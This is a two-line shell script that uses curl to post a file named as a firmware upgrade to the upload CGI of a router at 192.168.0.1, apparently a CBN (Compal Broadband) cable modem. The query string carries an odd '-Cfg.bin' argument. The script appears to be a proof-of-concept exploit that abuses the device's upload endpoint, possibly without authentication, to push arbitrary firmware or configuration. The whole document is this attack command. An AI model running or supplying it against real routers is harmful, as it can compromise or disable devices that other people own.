#!/bin/sh
curl -D- -F 'CBNFileUpload=@tmp;filename=CBN_FW_UPGRADE' 'http://192.168.0.1/cbnUpload.cgi?-Cfg.bin'
